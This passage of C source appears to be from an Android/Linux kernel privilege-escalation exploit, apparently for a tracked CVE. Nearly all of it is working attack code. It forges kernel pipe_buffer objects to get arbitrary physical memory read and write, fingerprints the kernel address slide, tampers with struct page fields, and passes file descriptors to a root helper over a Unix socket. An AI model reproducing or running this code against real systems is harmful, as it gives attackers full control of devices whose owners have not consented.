         tail += sizeof(uint64_t)) {
      uint64_t value = 0;
      memcpy(&value, slab + tail, sizeof(value));
      if (value != 0) {
        zero_tail = 0;
        break;
      }
    }
    if (!zero_tail || candidate_count >= PIPE_OBJS_PER_SLAB) {
      continue;
    }
    candidates[candidate_count] = pb;
    candidate_offsets[candidate_count] = off;
    candidate_count++;
  }

  int best_count = 0;
  int best_start = 0;
  for (int start = 1; start <= PIPE_RECLAIM; start++) {
    uint32_t lens = 0;
    for (int i = 0; i < candidate_count; i++) {
      int len = (int)candidates[i].len;
      if (len >= start && len < start + PIPE_OBJS_PER_SLAB) {
        lens |= 1U << (len - start);
      }
    }
    int distinct = __builtin_popcount(lens);
    if (distinct > best_count) {
      best_count = distinct;
      best_start = start;
    }
  }

#if PIPE_SOCKET_INTERLEAVE_RECLAIM
  int required_count = PIPE_OBJS_PER_SLAB;
#else
  int required_count = PIPE_OBJS_PER_SLAB - 4;
#endif
  if (best_count < required_count) {
    return 0;
  }

  for (int i = 0; i < candidate_count; i++) {
    int len = (int)candidates[i].len;
    if (len < best_start || len >= best_start + PIPE_OBJS_PER_SLAB) {
      continue;
    }
    pipebuf_addr = base + candidate_offsets[i];
    pipebuf_pipe_idx = len - 1;
    pipe_probe_found = 1;
    pipe_probe_page = candidates[i].page;
    pipe_probe_ops = candidates[i].ops;
    pipe_probe_private = candidates[i].private;
    pipe_probe_len = candidates[i].len;
    pipe_probe_flags = candidates[i].flags;
    return 1;
  }
  return 0;
}

static int restore_pipe_buffer_exact(
    int fd, uintptr_t address, const struct user_pipe_buffer *saved) {
  for (int attempt = 0; attempt < 3; attempt++) {
    ssize_t wrote = kernel_write_data(fd, address, saved, sizeof(*saved));
    struct user_pipe_buffer after;
    memset(&after, 0, sizeof(after));
    ssize_t read_back = kernel_read_data(
        fd, address, &after, sizeof(after));
    if (wrote == (ssize_t)sizeof(*saved) &&
        read_back == (ssize_t)sizeof(after) &&
        memcmp(&after, saved, sizeof(after)) == 0) {
      return 1;
    }
  }
  pr_warning("pipe_buffer restore remains unverified at %016zx; "
             "holding process to avoid closing a forged pipe\n",
             address);
  mark_exploit_safety(EXPLOIT_SAFETY_HOLD);
  fflush(NULL);
  for (;;) {
    sleep(60);
  }
}

int pipe_phys_read(
    int fd, int pipefd[2], uintptr_t buf_addr, uintptr_t direct_addr,
    void *out, size_t len) {
  struct user_pipe_buffer saved;
  if (kernel_read_data(fd, buf_addr, &saved, sizeof(saved)) !=
      (ssize_t)sizeof(saved)) {
    return 0;
  }

  struct user_pipe_buffer pb = saved;
  pb.page = direct_to_page(direct_addr);
  pb.offset = direct_addr & (PAGE_SIZE - 1);
  pb.len = len + 1;
  pb.ops = pipe_buf_ops_addr();
  pb.flags = PIPE_BUF_FLAG_CAN_MERGE;
  pb.private = 0;

  if (kernel_write_data(fd, buf_addr, &pb, sizeof(pb)) !=
      (ssize_t)sizeof(pb)) {
    restore_pipe_buffer_exact(fd, buf_addr, &saved);
    return 0;
  }

  ssize_t got = read(pipefd[0], out, len);
  int ok = got == (ssize_t)len;
  return restore_pipe_buffer_exact(fd, buf_addr, &saved) && ok;
}

int pipe_phys_write(
    int fd, int pipefd[2], uintptr_t buf_addr, uintptr_t direct_addr,
    const void *data, size_t len) {
  struct user_pipe_buffer saved;
  if (kernel_read_data(fd, buf_addr, &saved, sizeof(saved)) !=
      (ssize_t)sizeof(saved)) {
    return 0;
  }

  struct user_pipe_buffer pb = saved;
  pb.page = direct_to_page(direct_addr);
  pb.offset = direct_addr & (PAGE_SIZE - 1);
  pb.len = 0;
  pb.ops = pipe_buf_ops_addr();
  pb.flags = PIPE_BUF_FLAG_CAN_MERGE;
  pb.private = 0;

  if (kernel_write_data(fd, buf_addr, &pb, sizeof(pb)) !=
      (ssize_t)sizeof(pb)) {
    restore_pipe_buffer_exact(fd, buf_addr, &saved);
    return 0;
  }

  ssize_t wrote = write(pipefd[1], data, len);
  int ok = wrote == (ssize_t)len;
  return restore_pipe_buffer_exact(fd, buf_addr, &saved) && ok;
}

void forge_pipe_buffers_on_page(
    int fd, uintptr_t base, uintptr_t direct_addr, size_t len, int for_write) {
  struct user_pipe_buffer pb;
  memset(&pb, 0, sizeof(pb));
  pb.page = direct_to_page(direct_addr);
  pb.offset = direct_addr & (PAGE_SIZE - 1);
  pb.len = for_write ? 0 : len + 1;
  pb.ops = pipe_buf_ops_addr();
  pb.flags = PIPE_BUF_FLAG_CAN_MERGE;

  for (size_t off = 0; off < PIPE_SLAB_SIZE; off += PIPE_OBJECT_SIZE) {
    kernel_write_data(fd, base + off, &pb, sizeof(pb));
  }
}

int pipe_phys_read_data(int fd, uintptr_t direct_addr, void *out, size_t len) {
  if (pipebuf_page_base == 0 || pipebuf_pipe_idx < 0) {
    return 0;
  }
  if (!is_direct_ptr(direct_addr) ||
      (direct_addr & (PAGE_SIZE - 1)) + len > PAGE_SIZE) {
    return 0;
  }

  if (pipebuf_addr) {
    int *pipefd = pipe_fds_reclaim[pipebuf_pipe_idx];
    return pipe_phys_read(fd, pipefd, pipebuf_addr, direct_addr, out, len);
  } else {
    forge_pipe_buffers_on_page(fd, pipebuf_page_base, direct_addr, len, 0);
    ssize_t got = read(pipe_fds_reclaim[pipebuf_pipe_idx][0], out, len);
    return got == (ssize_t)len;
  }
}

int pipe_phys_write_data(
    int fd, uintptr_t direct_addr, const void *data, size_t len) {
  if (pipebuf_page_base == 0 || pipebuf_pipe_idx < 0) {
    return 0;
  }
  if (!is_direct_ptr(direct_addr) ||
      (direct_addr & (PAGE_SIZE - 1)) + len > PAGE_SIZE) {
    return 0;
  }

  if (pipebuf_addr) {
    int *pipefd = pipe_fds_reclaim[pipebuf_pipe_idx];
    return pipe_phys_write(fd, pipefd, pipebuf_addr, direct_addr, data, len);
  } else {
    forge_pipe_buffers_on_page(fd, pipebuf_page_base, direct_addr, len, 1);
    ssize_t wrote = write(pipe_fds_reclaim[pipebuf_pipe_idx][1], data, len);
    return wrote == (ssize_t)len;
  }
}

uint64_t pipe_read64(int fd, uintptr_t direct_addr) {
  uint64_t value = 0;
  pipe_phys_read_data(fd, direct_addr, &value, sizeof(value));
  return value;
}

int pipe_write64(int fd, uintptr_t direct_addr, uint64_t value) {
  return pipe_phys_write_data(fd, direct_addr, &value, sizeof(value));
}

int install_pipe_physrw(int fd) {
  if (pipebuf_page_base == 0) {
    atomic_store(&pipe_prepare_status, PIPE_PREPARE_PENDING);
    if (!lift_pipe_user_page_limits(fd)) {
      if (pipe_user_page_limits_uncertain()) {
        mark_pipe_prepare_uncertain("quota-lift-or-restore");
      } else {
        publish_pipe_prepare_status(PIPE_PREPARE_CLEAN_MISS);
      }
      pr_warning("pipe quota lift failed; refusing allocator preparation "
                 "and unwinding PI route\n");
      return 0;
    }
#if PIPE_SOCKET_INTERLEAVE_RECLAIM
    pipe_prepare_kernel_fd = fd;
#endif
    atomic_store(&pipe_prepare_done, 0);
    atomic_store(&pipe_prepare_request, 1);
    struct timespec prepare_start;
    int prepare_clock_valid =
        clock_gettime(CLOCK_MONOTONIC, &prepare_start) == 0;
    int prepare_timeout_reported = 0;
    if (!prepare_clock_valid) {
      hold_pipe_prepare_inflight("clock-start", errno);
    }
    while (!atomic_load(&pipe_prepare_done)) {
      usleep(10000);
      if (!prepare_clock_valid) {
        continue;
      }
      struct timespec now;
      if (clock_gettime(CLOCK_MONOTONIC, &now) != 0) {
        hold_pipe_prepare_inflight("clock-poll", errno);
        prepare_clock_valid = 0;
        continue;
      }
      if (!prepare_timeout_reported &&
          now.tv_sec - prepare_start.tv_sec >= PIPE_PREPARE_TIMEOUT_SEC) {
        hold_pipe_prepare_inflight("timeout", ETIMEDOUT);
        prepare_timeout_reported = 1;
      }
    }
    if (!restore_pipe_user_page_limits()) {
      atomic_store(&pipe_prepare_status, PIPE_PREPARE_UNCERTAIN);
      atomic_store(&cfi_safe_hold_required, 1);
      mark_exploit_safety(EXPLOIT_SAFETY_HOLD);
      pr_warning("pipe quota restore failed; deferring safety hold until "
                 "after PI cleanup\n");
      return 0;
    }
  }

  int prepare_status = atomic_load(&pipe_prepare_status);
  if ((prepare_status == PIPE_PREPARE_IDLE ||
       prepare_status == PIPE_PREPARE_PENDING) &&
      is_direct_ptr(pipebuf_page_base)) {
    /* APP/P0 profiles may prepare a verified pipe page before this call. */
    prepare_status = PIPE_PREPARE_READY;
  }
  if (prepare_status != PIPE_PREPARE_READY ||
      !pipe_socket_base_is_valid(pipebuf_page_base)) {
    errno = EAGAIN;
    pr_warning("pipe allocator clean miss status=%d base=%016zx; skipping "
               "marker/cache/physical-RW stages\n",
               prepare_status, pipebuf_page_base);
    return 0;
  }

  char marker[PIPE_RECLAIM];
  memset(marker, 0x61, sizeof(marker));
  for (size_t i = 0; i < PIPE_RECLAIM; i++) {
    int available = -1;
    if (ioctl(pipe_fds_reclaim[i][0], FIONREAD, &available) != 0 ||
        available != 0) {
      pr_warning("pipe marker precondition failed index=%zu available=%d: "
                 "%m; unwinding PI route before teardown\n",
                 i, available);
      return 0;
    }
    ssize_t wrote = write(pipe_fds_reclaim[i][1], marker, i + 1);
    if (wrote != (ssize_t)(i + 1)) {
      pr_warning("pipe marker write failed index=%zu wanted=%zu got=%zd: "
                 "%m; unwinding PI route before teardown\n",
                 i, i + 1, wrote);
      return 0;
    }
  }

  if (!pipe_reclaim_cache_gate(fd)) {
    pr_info("phys step cache gate failed slab=%016zx want=%016zx\n",
             candidate_slab_cache, kmalloc_pipe_cache);
    return 0;
  }

  int found = find_pipe_buffer(fd, pipebuf_page_base);
  if (!found) {
    int restored = restore_pipe_usercopy_cache(fd);
    if (!restored) {
      mark_exploit_safety(EXPLOIT_SAFETY_HOLD);
      pr_warning("pipe ownership failed and slab_cache restore failed; "
                 "holding process to avoid unsafe pipe teardown\n");
      fflush(NULL);
      for (;;) {
        sleep(60);
      }
    }
    pr_info("phys step pipe ownership rejected pipebuf=%016zx idx=%d "
            "scan=%d/%d/%d\n",
            pipebuf_addr, pipebuf_pipe_idx, pipe_scan_vmemmap,
            pipe_scan_ops, pipe_scan_len);
    pipe_cache_gate_ok = 0;
    return 0;
  }
  pr_info("phys step pipe ownership accepted pipebuf=%016zx idx=%d "
          "scan=%d/%d/%d\n",
          pipebuf_addr, pipebuf_pipe_idx, pipe_scan_vmemmap,
          pipe_scan_ops, pipe_scan_len);
#if PIPE_SOCKET_INTERLEAVE_RECLAIM && \
    defined(PIPE_HARDENED_USERCOPY_CACHE_SHIM) && \
    PIPE_HARDENED_USERCOPY_CACHE_SHIM
  pr_info("pipe usercopy shim active head=%016zx real=%016llx fake=%016zx "
          "after full ownership proof\n",
          pipe_usercopy_slab_head,
          (unsigned long long)pipe_usercopy_original_cache,
          pipe_usercopy_fake_cache);
#endif
  if (!pipe_cache_gate_ok) {
    pipe_cache_gate_ok = 2;
  }

#if PIPE_SOCKET_INTERLEAVE_RECLAIM
  _Static_assert(PIPE_BUFFER_SLOTS * sizeof(struct user_pipe_buffer) +
                     0x100 + sizeof(uint64_t) <=
                   KMALLOC_PIPE_OBJ_SIZE,
                 "physical proof must remain in the owned pipe object slack");
  uintptr_t proof_addr =
      pipebuf_addr + PIPE_BUFFER_SLOTS * sizeof(struct user_pipe_buffer);
#else
  uintptr_t proof_addr = page_base + PHYSRW_PROOF_OFF;
#endif
  uintptr_t proof_page = page_to_direct(direct_to_page(proof_addr));
  if (proof_page != (proof_addr & ~(PAGE_SIZE - 1))) {
    return 0;
  }

  char seed[] = PHYS_READ_TAG;
  if (kernel_write_data(fd, proof_addr, seed, sizeof(seed)) !=
      (ssize_t)sizeof(seed)) {
    return 0;
  }

  memset(physrw_readback, 0, sizeof(physrw_readback));
  physrw_read_ok =
    pipe_phys_read_data(fd, proof_addr, physrw_readback, sizeof(seed));
  pr_info("phys step probed read done ok=%d idx=%d\n",
           physrw_read_ok, pipebuf_pipe_idx);
  if (!physrw_read_ok ||
      memcmp(physrw_readback, seed, sizeof(seed)) != 0) {
    pr_info("phys step probe readback mismatch; aborting before writes\n");
    return 0;
  }

  char overwrite[] = PHYS_WRITE_TAG;
  physrw_write_ok =
    pipe_phys_write_data(fd, proof_addr, overwrite, sizeof(overwrite));
  pr_info("phys step probed write done ok=%d\n", physrw_write_ok);
  if (kernel_read_data(fd, proof_addr, physrw_after_write,
                       sizeof(overwrite)) != (ssize_t)sizeof(overwrite)) {
    return 0;
  }

  uintptr_t proof64_addr = proof_addr + 0x100;
  uint64_t seed64 = PHYS64_SEED;
  uint64_t next64 = PHYS64_NEXT;
  if (kernel_write_data(fd, proof64_addr, &seed64, sizeof(seed64)) !=
      (ssize_t)sizeof(seed64)) {
    return 0;
  }
  physrw_read64_before = pipe_read64(fd, proof64_addr);
  physrw_read64_ok = physrw_read64_before == seed64;
  pr_info("phys step read64 done ok=%d value=%016zx\n",
          physrw_read64_ok, physrw_read64_before);
  physrw_write64_value = next64;
  physrw_write64_ok = pipe_write64(fd, proof64_addr, next64);
  if (kernel_read_data(fd, proof64_addr, &physrw_read64_after,
                       sizeof(physrw_read64_after)) !=
      (ssize_t)sizeof(physrw_read64_after)) {
    return 0;
  }
  physrw_write64_ok =
    physrw_write64_ok && physrw_read64_after == physrw_write64_value;

  return physrw_read_ok &&
         memcmp(physrw_readback, seed, sizeof(seed)) == 0 &&
         physrw_write_ok &&
         memcmp(physrw_after_write, overwrite, sizeof(overwrite)) == 0 &&
         physrw_read64_ok && physrw_write64_ok;
}

#if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
static int pipe_write_full(int fd, const void *data, size_t size) {
  const unsigned char *cursor = data;
  while (size) {
    ssize_t wrote = write(fd, cursor, size);
    if (wrote <= 0) {
      return 0;
    }
    cursor += wrote;
    size -= (size_t)wrote;
  }
  return 1;
}

static int pipe_read_full(int fd, void *data, size_t size) {
  unsigned char *cursor = data;
  while (size) {
    ssize_t got = read(fd, cursor, size);
    if (got <= 0) {
      return 0;
    }
    cursor += got;
    size -= (size_t)got;
  }
  return 1;
}

static int pipe_duplicate_bytes(
    int source_fd, int holder[2], size_t size, size_t slots) {
  SYSCHK(pipe(holder));
  resize_pipe_slots(holder, slots);
  errno = 0;
  ssize_t duplicated = syscall(SYS_tee, source_fd, holder[1], size, 0);
  return duplicated == (ssize_t)size;
}

static int transfer_p0_references_to_root(int retained_pipe_index) {
  int retained_fds[] = {
    pipe_fds_reclaim[retained_pipe_index][0],
    p0_gate_holders[retained_pipe_index][0],
    reclaim_receiver_fd(),
  };
  for (size_t index = 0;
       index < sizeof(retained_fds) / sizeof(retained_fds[0]); index++) {
    if (retained_fds[index] < 0) {
      return 0;
    }
  }

  int socket_fd = socket(AF_UNIX, SOCK_STREAM | SOCK_CLOEXEC, 0);
  if (socket_fd < 0) {
    return 0;
  }
  struct sockaddr_un address;
  memset(&address, 0, sizeof(address));
  address.sun_family = AF_UNIX;
  snprintf(address.sun_path, sizeof(address.sun_path), "%s",
           "/data/local/tmp/temp_su.sock");
  if (connect(socket_fd, (struct sockaddr *)&address, sizeof(address)) != 0) {
    close(socket_fd);
    return 0;
  }

  char allowed = 0;
  char operation = 'H';
  if (!pipe_read_full(socket_fd, &allowed, sizeof(allowed)) || allowed != 'A' ||
      !pipe_write_full(socket_fd, &operation, sizeof(operation))) {
    close(socket_fd);
    return 0;
  }

  char marker = 'P';
  struct iovec iov = {
    .iov_base = &marker,
    .iov_len = sizeof(marker),
  };
  char control[CMSG_SPACE(sizeof(retained_fds))];
  struct msghdr message;
  memset(&message, 0, sizeof(message));
  memset(control, 0, sizeof(control));
  message.msg_iov = &iov;
  message.msg_iovlen = 1;
  message.msg_control = control;
  message.msg_controllen = sizeof(control);
  struct cmsghdr *cmsg = CMSG_FIRSTHDR(&message);
  cmsg->cmsg_level = SOL_SOCKET;
  cmsg->cmsg_type = SCM_RIGHTS;
  cmsg->cmsg_len = CMSG_LEN(sizeof(retained_fds));
  memcpy(CMSG_DATA(cmsg), retained_fds, sizeof(retained_fds));
  if (sendmsg(socket_fd, &message, 0) != (ssize_t)sizeof(marker)) {
    close(socket_fd);
    return 0;
  }

  char acknowledged = 0;
  int transferred = pipe_read_full(
      socket_fd, &acknowledged, sizeof(acknowledged)) && acknowledged == 'K';
  close(socket_fd);
  return transferred;
}

static void spawn_p0_ref_keeper(int retained_pipe_index) {
  pid_t child = SYSCHK(fork());
  if (child != 0) {
    pr_info("p0 reference keeper pid=%d pipe=%d\n",
            child, retained_pipe_index);
    return;
  }
  syscall(SYS_prctl, PR_SET_PDEATHSIG, 0, 0, 0, 0);
  syscall(SYS_prctl, PR_SET_NAME, "cve43499-p0ref", 0, 0, 0);
  syscall(SYS_setsid);
  int null_fd = (int)syscall(
      SYS_openat, AT_FDCWD, "/dev/null", O_RDWR | O_CLOEXEC, 0);
  if (null_fd >= 0) {
    for (int fd = STDIN_FILENO; fd <= STDERR_FILENO; fd++) {
      if (fd != null_fd) {
        syscall(SYS_dup3, null_fd, fd, 0);
      }
    }
    if (null_fd > STDERR_FILENO) {
      syscall(SYS_close, null_fd);
    }
  }
  if (retained_pipe_index >= 0) {
    for (size_t pipe_index = 0; pipe_index < PIPE_RECLAIM; pipe_index++) {
      if ((int)pipe_index != retained_pipe_index) {
        syscall(SYS_close, pipe_fds_reclaim[pipe_index][0]);
        syscall(SYS_close, pipe_fds_reclaim[pipe_index][1]);
        syscall(SYS_close, p0_gate_holders[pipe_index][0]);
        syscall(SYS_close, p0_gate_holders[pipe_index][1]);
        continue;
      }
      syscall(SYS_close, pipe_fds_reclaim[pipe_index][1]);
      syscall(SYS_close, p0_gate_holders[pipe_index][1]);
    }
  }
  if (retained_pipe_index < 0) {
    for (;;) {
      pause();
    }
  }
  for (;;) {
    if (transfer_p0_references_to_root(retained_pipe_index)) {
      _exit(0);
    }
    usleep(10000);
  }
}

int prepare_p0_pipe_oracle(void) {
  _Static_assert(sizeof(struct user_pipe_buffer) == 0x28,
                 "unexpected pipe_buffer size");

  for (size_t pipe_index = 0; pipe_index < PIPE_RECLAIM; pipe_index++) {
    p0_gate_holders[pipe_index][0] = -1;
    p0_gate_holders[pipe_index][1] = -1;
  }
  p0_gate_holders_initialized = 1;

  pipebuf_page_base = prepare_pipe_buffer_page();
  if (!is_direct_ptr(pipebuf_page_base)) {
    return 0;
  }

  unsigned char marker[PAGE_SIZE];
  memset(marker, 0x5a, sizeof(marker));
  memcpy(marker, "RMG-P0-PIPE", 11);
  for (size_t pipe_index = 0; pipe_index < PIPE_RECLAIM; pipe_index++) {
    if (!pipe_write_full(pipe_fds_reclaim[pipe_index][1], marker,
                         sizeof(marker))) {
      return 0;
    }
  }
  pr_info("p0 pipe oracle prepared base=%016zx pipes=%d gate_slots=1\n",
          pipebuf_page_base, PIPE_RECLAIM);
  return 1;
}

int expand_p0_pipe_oracle(void) {
  unsigned char marker[PAGE_SIZE];
  memset(marker, 0x5a, sizeof(marker));
  memcpy(marker, "RMG-P0-PIPE", 11);
  for (size_t pipe_index = 0; pipe_index < PIPE_RECLAIM; pipe_index++) {
    for (size_t slot = 1; slot < PIPE_BUFFER_SLOTS; slot++) {
      if (!pipe_write_full(pipe_fds_reclaim[pipe_index][1], marker,
                           sizeof(marker))) {
        return 0;
      }
    }
  }
  pr_info("p0 pipe oracle expanded pipes=%d slots=%d\n",
          PIPE_RECLAIM, PIPE_BUFFER_SLOTS);
  return 1;
}

int verify_p0_pipe_oracle_gate(void) {
  unsigned char page[PAGE_SIZE];
  int gate_hits = 0;
  int gate_pipe_index = -1;
  int changed_pages = 0;
#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
  p0_gate_holders_initialized = 1;
#endif
  for (size_t pipe_index = 0; pipe_index < PIPE_RECLAIM; pipe_index++) {
    if (!pipe_duplicate_bytes(pipe_fds_reclaim[pipe_index][0],
                              p0_gate_holders[pipe_index], PAGE_SIZE, 1)) {
      pr_warning("p0 gate tee failed pipe=%zu errno=%d\n",
                 pipe_index, errno);
      spawn_p0_ref_keeper(-1);
      return 0;
    }
    if (!pipe_read_full(pipe_fds_reclaim[pipe_index][0], page,
                        sizeof(page))) {
      spawn_p0_ref_keeper(-1);
      return 0;
    }
    size_t gate_offset = PAGE_SIZE;
    for (size_t offset = 0; offset + 18 <= PAGE_SIZE; offset++) {
      if (memcmp(page + offset, "RMG-P0-ORACLE-GATE", 18) == 0) {
        gate_offset = offset;
        break;
      }
    }
    if (gate_offset != PAGE_SIZE) {
      gate_hits++;
      gate_pipe_index = (int)pipe_index;
      pr_info("p0 gate marker pipe=%zu offset=%zu\n",
              pipe_index, gate_offset);
    } else if (memcmp(page, "RMG-P0-PIPE", 11) != 0) {
      changed_pages++;
      uint64_t words[8];
      memcpy(words, page, sizeof(words));
      pr_info("p0 gate changed pipe=%zu q0=%016llx q1=%016llx "
              "q2=%016llx q3=%016llx q4=%016llx q5=%016llx "
              "q6=%016llx q7=%016llx\n",
              pipe_index,
              (unsigned long long)words[0],
              (unsigned long long)words[1],
              (unsigned long long)words[2],
              (unsigned long long)words[3],
              (unsigned long long)words[4],
              (unsigned long long)words[5],
              (unsigned long long)words[6],
              (unsigned long long)words[7]);
    }
  }

  unsigned char marker[PAGE_SIZE];
  memset(marker, 0x5a, sizeof(marker));
  memcpy(marker, "RMG-P0-PIPE", 11);
  for (size_t pipe_index = 0; pipe_index < PIPE_RECLAIM; pipe_index++) {
    if (!pipe_write_full(pipe_fds_reclaim[pipe_index][1], marker,
                         sizeof(marker))) {
      spawn_p0_ref_keeper(-1);
      return 0;
    }
  }
  pr_info("p0 pipe gate hits=%d changed=%d\n",
          gate_hits, changed_pages);
  if (gate_hits != 0 || changed_pages != 0) {
    spawn_p0_ref_keeper(
        gate_hits == 1 && changed_pages == 0 ? gate_pipe_index : -1);
  }
  if (gate_hits == 1 && changed_pages == 0) {
    return 1;
  }
  if (gate_hits == 0 && changed_pages == 0) {
#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
    close_p0_gate_holders();
#endif
    return 0;
  }
  return -1;
}

#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
int verify_p0_pipe_data_page(uintptr_t target, uint64_t expected) {
  unsigned char page[PAGE_SIZE];
  size_t target_offset = target & (PAGE_SIZE - 1);
  int changed_pages = 0;
  int exact_matches = 0;
  uint64_t observed = 0;

  if (target_offset + sizeof(observed) > sizeof(page)) {
    return -1;
  }
  for (size_t pipe_index = 0; pipe_index < PIPE_RECLAIM; pipe_index++) {
    if (!pipe_read_full(pipe_fds_reclaim[pipe_index][0], page,
                        sizeof(page))) {
      pr_warning("fops data alias read failed pipe=%zu errno=%d\n",
                 pipe_index, errno);
      return -1;
    }
    if (memcmp(page, "RMG-P0-PIPE", 11) == 0) {
      continue;
    }
    changed_pages++;
    memcpy(&observed, page + target_offset, sizeof(observed));
    if (observed == expected) {
      exact_matches++;
    }
    pr_info("fops data alias pipe=%zu target=%016zx offset=%zu "
            "observed=%016llx expected=%016llx match=%d\n",
            pipe_index, target, target_offset,
            (unsigned long long)observed,
            (unsigned long long)expected, observed == expected);
  }
  pr_info("fops data alias changed=%d exact=%d target=%016zx "
          "observed=%016llx expected=%016llx\n",
          changed_pages, exact_matches, target,
          (unsigned long long)observed, (unsigned long long)expected);
  if (changed_pages == 1 && exact_matches == 1) {
    return 1;
  }
  return changed_pages == 0 ? 0 : -1;
}
#endif

static int p0_fingerprint_score(
    const unsigned char *page, const struct p0_fingerprint *fingerprint) {
  int score = 0;
  for (size_t index = 0; index < P0_FINGERPRINT_WORDS; index++) {
    uint64_t value = 0;
    memcpy(&value, page + p0_fingerprint_offsets[index], sizeof(value));
    if (value == fingerprint->words[index]) {
      score++;
    }
  }
  return score;
}

uintptr_t scan_p0_pipe_oracle(void) {
  unsigned char page[PAGE_SIZE];
  size_t scan_size =
      p0_fingerprint_offsets[P0_FINGERPRINT_WORDS - 1] + sizeof(uint64_t);
  uintptr_t best_slide = (uintptr_t)-1;
  int best_score = -1;
  int second_score = -1;
  int changed_pages = 0;

  for (size_t pipe_index = 0; pipe_index < PIPE_RECLAIM; pipe_index++) {
    memset(page, 0, sizeof(page));
    if (!pipe_read_full(pipe_fds_reclaim[pipe_index][0], page,
                        scan_size)) {
      pr_warning("p0 scan partial read failed pipe=%zu size=%zu errno=%d\n",
                 pipe_index, scan_size, errno);
      return (uintptr_t)-1;
    }
    if (memcmp(page, "RMG-P0-PIPE", 11) == 0) {
      continue;
    }

    changed_pages++;
    uint64_t sampled_words[P0_FINGERPRINT_WORDS];
    for (size_t word = 0; word < P0_FINGERPRINT_WORDS; word++) {
      memcpy(&sampled_words[word], page + p0_fingerprint_offsets[word],
             sizeof(sampled_words[word]));
    }
    pr_info("p0 fingerprint sample "
            "w0=%016llx w1=%016llx w2=%016llx w3=%016llx "
            "w4=%016llx w5=%016llx w6=%016llx w7=%016llx\n",
            (unsigned long long)sampled_words[0],
            (unsigned long long)sampled_words[1],
            (unsigned long long)sampled_words[2],
            (unsigned long long)sampled_words[3],
            (unsigned long long)sampled_words[4],
            (unsigned long long)sampled_words[5],
            (unsigned long long)sampled_words[6],
            (unsigned long long)sampled_words[7]);
    for (size_t index = 0;
         index < sizeof(p0_fingerprints) / sizeof(p0_fingerprints[0]);
         index++) {
      int score = p0_fingerprint_score(page, &p0_fingerprints[index]);
      if (score > best_score) {
        second_score = best_score;
        best_score = score;
        best_slide = p0_fingerprints[index].slide;
      } else if (score > second_score) {
        second_score = score;
      }
    }
#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
    pr_info("p0 fingerprint pipe=%zu best=%d second=%d "
            "source_offset=%08zx\n",
            pipe_index, best_score, second_score, best_slide);
#else
    pr_info("p0 fingerprint pipe=%zu best=%d second=%d slide=%08zx\n",
            pipe_index, best_score, second_score, best_slide);
#endif
  }

#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
  pr_info("p0 fingerprint changed=%d best=%d second=%d "
          "source_offset=%08zx\n",
          changed_pages, best_score, second_score, best_slide);
#else
  pr_info("p0 fingerprint changed=%d best=%d second=%d slide=%08zx\n",
          changed_pages, best_score, second_score, best_slide);
#endif
  if (changed_pages != 1 || best_score < 2 || best_score <= second_score) {
    return (uintptr_t)-1;
  }
  return best_slide;
}

#if defined(APP_PHYS_VIRTUAL_BASE_ORACLE) && APP_PHYS_VIRTUAL_BASE_ORACLE
uint64_t scan_p0_virtual_base_pointer(void) {
  unsigned char page[PAGE_SIZE];
  size_t pointer_offset = data_addr(ASHMEM_MISC_FOPS) & (PAGE_SIZE - 1);
  size_t read_size = pointer_offset + sizeof(uint64_t);
  uint64_t pointer = 0;
  int changed_pages = 0;

  for (size_t pipe_index = 0; pipe_index < PIPE_RECLAIM; pipe_index++) {
    memset(page, 0, sizeof(page));
    if (!pipe_read_full(pipe_fds_reclaim[pipe_index][0], page, read_size)) {
      pr_warning("p0 virtual probe partial read failed pipe=%zu size=%zu "
                 "errno=%d\n", pipe_index, read_size, errno);
      return 0;
    }
    if (memcmp(page, "RMG-P0-PIPE", 11) == 0) {
      continue;
    }
    changed_pages++;
    memcpy(&pointer, page + pointer_offset, sizeof(pointer));
    pr_info("p0 virtual probe pipe=%zu offset=%zu pointer=%016llx\n",
            pipe_index, pointer_offset, (unsigned long long)pointer);
  }

  pr_info("p0 virtual probe changed=%d pointer=%016llx\n",
          changed_pages, (unsigned long long)pointer);
  if (changed_pages != 1 || (pointer >> 48) != 0xffff) {
    return 0;
  }
  return pointer;
}
#endif

int restore_p0_oracle_pages(int fd) {
  if (!p0_gate_page_struct && !p0_probe_page_struct) {
    return 1;
  }
  if (!p0_gate_page_struct || !p0_probe_page_struct) {
    return 0;
  }
  uintptr_t pages[] = {
    p0_gate_page_struct,
    p0_probe_page_struct,
  };
  uint64_t zero = 0;
  int restored = 1;

  for (size_t index = 0; index < sizeof(pages) / sizeof(pages[0]); index++) {
    uintptr_t compound_head = pages[index] + STRUCT_PAGE_COMPOUND_HEAD_OFF;
    uint64_t before = 0;
    uint64_t after = UINT64_MAX;
    ssize_t read_before = configfs_read_once(
        fd, compound_head, &before, sizeof(before));
    ssize_t write_ret = configfs_write_once(
        fd, compound_head, &zero, sizeof(zero));
    ssize_t read_after = configfs_read_once(
        fd, compound_head, &after, sizeof(after));
    pr_info("p0 restore page=%016zx read=%zd write=%zd verify=%zd "
            "before=%016llx after=%016llx\n",
            pages[index], read_before, write_ret, read_after,
            (unsigned long long)before, (unsigned long long)after);
    if (read_before != (ssize_t)sizeof(before) ||
        write_ret != (ssize_t)sizeof(zero) ||
        read_after != (ssize_t)sizeof(after) || after != 0) {
      restored = 0;
    }
  }
  return restored;
}
#endif
